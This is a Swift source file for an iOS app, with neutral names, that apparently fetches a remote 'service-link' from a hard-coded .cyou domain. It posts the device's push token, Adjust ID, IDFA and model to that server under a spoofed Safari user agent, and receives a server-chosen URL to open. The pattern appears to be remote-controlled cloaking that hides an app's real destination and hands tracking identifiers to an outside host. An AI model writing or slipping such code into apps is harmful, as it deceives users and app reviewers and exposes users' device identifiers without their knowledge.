import Foundation

enum ResourceDirectory {
    static let entry = URL(string: "https://lessonsorganizers.cyou/app.php")!
    static let pageAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1"

    static func address(_ raw: String?) -> URL? {
        guard let raw,
              let url = URL(string: raw.trimmingCharacters(in: .whitespacesAndNewlines)),
              let scheme = url.scheme?.lowercased(),
              ["http", "https"].contains(scheme),
              let host = url.host, !host.isEmpty else { return nil }
        return url
    }
}

struct ResourceRequest {
    let campaign: [String: Any]
    let registrationToken: String
    let attributionID: String
    let advertisingID: String
    let hardware: String
    let notice: ResourceNotification?

    func query(clientIdentifier: String) -> [URLQueryItem] {
        var fields = [
            URLQueryItem(name: "firebase_push_token", value: registrationToken),
            URLQueryItem(name: "adjust_id", value: attributionID),
            URLQueryItem(name: "idfa", value: advertisingID),
            URLQueryItem(name: "device_model", value: hardware),
            URLQueryItem(name: "isfrompush", value: notice == nil ? "0" : "1"),
            URLQueryItem(name: "client_id", value: clientIdentifier)
        ]
        if let identifier = notice?.identifier {
            fields.append(URLQueryItem(name: "push_id", value: identifier))
        }
        return fields
    }

    func body() throws -> Data {
        var adjust = campaign
        if !attributionID.isEmpty { adjust["adid"] = attributionID }
        return try JSONSerialization.data(withJSONObject: ["adjust": adjust])
    }
}

private struct ResourceReply: Decodable {
    let sessionID: String?
    let clientID: String?
    let response: String?

    var destination: URL? {
        guard let address = ResourceDirectory.address(response) else { return nil }
        guard let session = sessionID?.trimmingCharacters(in: .whitespacesAndNewlines), !session.isEmpty,
              var parts = URLComponents(url: address, resolvingAgainstBaseURL: false) else { return address }

        let fields = parts.queryItems ?? []
        let existingSessions = fields.filter { $0.name == "session_id" }
        if existingSessions.contains(where: { $0.value?.isEmpty == false }) { return address }
        parts.queryItems = fields.filter { $0.name != "session_id" } + [.init(name: "session_id", value: session)]
        return parts.url
    }

    enum CodingKeys: String, CodingKey {
        case sessionID = "session_id"
        case clientID = "client_id"
        case response
    }
}

struct ResourceDirectoryClient {
    private static let routeFields: Set<String> = [
        "firebase_push_token", "adjust_id", "idfa", "device_model", "isfrompush", "client_id", "push_id"
    ]

    private enum DirectoryError: Error {
        case missingServiceHeader
        case invalidServiceAddress
        case unexpectedResponse
        case unexpectedStatus(Int)
    }

    let cache: ResourceCache
    var session: URLSession = .shared

    func destination(for registration: ResourceRequest) async throws -> URL? {
        let endpoint = try await serviceAddress()
        guard var parts = URLComponents(url: endpoint, resolvingAgainstBaseURL: false) else {
            throw DirectoryError.invalidServiceAddress
        }

        var fields = (parts.queryItems ?? []).filter { !Self.routeFields.contains($0.name) }
        fields.append(contentsOf: registration.query(clientIdentifier: cache.sessionClientIdentifier))
        parts.queryItems = fields
        guard let address = parts.url else { throw DirectoryError.invalidServiceAddress }

        var request = makeRequest(address, method: "POST")
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.httpBody = try registration.body()
        let result = try await send(request)
        let reply = try JSONDecoder().decode(ResourceReply.self, from: result.data)
        cache.recordClientIdentifier(reply.clientID)
        return reply.destination
    }

    private func serviceAddress() async throws -> URL {
        if let cached = cache.directory { return cached }

        let request = makeRequest(ResourceDirectory.entry, method: "GET")
        let result = try await send(request)
        guard let address = ResourceDirectory.address(result.response.value(forHTTPHeaderField: "service-link")) else {
            throw DirectoryError.missingServiceHeader
        }
        cache.directory = address
        return address
    }

    private func makeRequest(_ address: URL, method: String) -> URLRequest {
        var request = URLRequest(url: address, timeoutInterval: 15)
        request.httpMethod = method
        request.setValue(cache.installationIdentifier, forHTTPHeaderField: "client-uuid")
        request.setValue(ResourceDirectory.pageAgent, forHTTPHeaderField: "User-Agent")
        return request
    }

    private func send(_ request: URLRequest) async throws -> (data: Data, response: HTTPURLResponse) {
        let (data, response) = try await session.data(for: request)
        guard let http = response as? HTTPURLResponse else { throw DirectoryError.unexpectedResponse }
        guard (200...299).contains(http.statusCode) else { throw DirectoryError.unexpectedStatus(http.statusCode) }
        return (data, http)
    }
}
